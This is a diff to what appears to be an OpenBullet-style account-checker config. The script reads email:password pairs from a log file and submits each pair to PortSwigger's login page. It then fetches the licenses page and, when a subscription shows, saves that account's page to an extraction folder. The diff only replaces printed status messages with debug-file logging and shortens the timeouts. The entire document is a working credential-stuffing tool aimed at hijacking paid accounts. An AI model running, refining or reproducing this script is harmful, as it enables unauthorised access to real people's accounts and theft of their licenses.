@@ -5,7 +5,10 @@ FileReadLines "Configs\log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
 SET VAR "counter" "0" Integer
-SET VAR "success_count" "0" Integer
+
+ConstantString "Configs\test_debug.txt" -> VAR "debugFile"
+ConstantString "Debug log started" -> VAR "logEntry"
+FileWriteString $"<debugFile>" $"<logEntry>"
 
 FOREACH $"<accounts>" -> VAR "account"
 
@@ -19,16 +22,18 @@ FOREACH $"<accounts>" -> VAR "account"
   SET VAR "email" $"<creds[0]>"
   SET VAR "password" $"<creds[1]>"
 
-  PRINT "About to make request" White
+  ConstantString "Email extracted" -> VAR "logMsg"
+  FileAppendString $"<debugFile>" $"<logMsg>"
 
-  ## Step 1: GET login page with shorter timeout
+  ## Step 1: GET login page
   HttpRequest GET "https://login.portswigger.net/u/login" ReadResponseSource=True
-    TIMEOUT 10000
+    TIMEOUT 5000
     -> VAR "loginPageRes"
 
-  PRINT "Step 1 done" White
+  ConstantString "Step 1 completed" -> VAR "logMsg"
+  FileAppendString $"<debugFile>" $"<logMsg>"
 
-  ## Step 2: POST credentials with email/password
+  ## Step 2: POST credentials
   ConstantString "username=" -> VAR "postData"
   Append $"<postData>" $"<email>" -> VAR "postData"
   Append $"<postData>" "&password=" -> VAR "postData"
@@ -38,33 +43,35 @@ FOREACH $"<accounts>" -> VAR "account"
   HttpRequest POST "https://login.portswigger.net/u/login" ReadResponseSource=True
     CONTENT $"<postData>"
     CONTENTTYPE "application/x-www-form-urlencoded"
-    TIMEOUT 10000
+    TIMEOUT 5000
     -> VAR "loginRes"
 
-  PRINT "Step 2 done" White
+  ConstantString "Step 2 completed" -> VAR "logMsg"
+  FileAppendString $"<debugFile>" $"<logMsg>"
 
   ## Step 3: GET licenses page
   HttpRequest GET "https://portswigger.net/users/youraccount/licenses" ReadResponseSource=True
-    TIMEOUT 10000
+    TIMEOUT 5000
     -> VAR "licensesRes"
 
-  PRINT "Step 3 done" White
+  ConstantString "Step 3 completed" -> VAR "logMsg"
+  FileAppendString $"<debugFile>" $"<logMsg>"
 
   ## Check if successful
   IF $"<licensesRes>" Contains "subscription"
-    PRINT "Success found" Green
+    ConstantString "Subscription found" -> VAR "logMsg"
+    FileAppendString $"<debugFile>" $"<logMsg>"
 
     ConstantString "Configs\extraction_results\test.html" -> VAR "htmlFile"
     StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
     FileWriteBytes $"<htmlFile>" $"<htmlBytes>"
-
-    SUM $"<success_count>" 1 -> VAR "success_count"
   ELSE
-    PRINT "No subscription" Red
+    ConstantString "No subscription" -> VAR "logMsg"
+    FileAppendString $"<debugFile>" $"<logMsg>"
   ENDIF
 
   Delay 500
 
 ENDFOREACH
 
-PRINT "Done" White
+PRINT "Done - check Configs\test_debug.txt" White
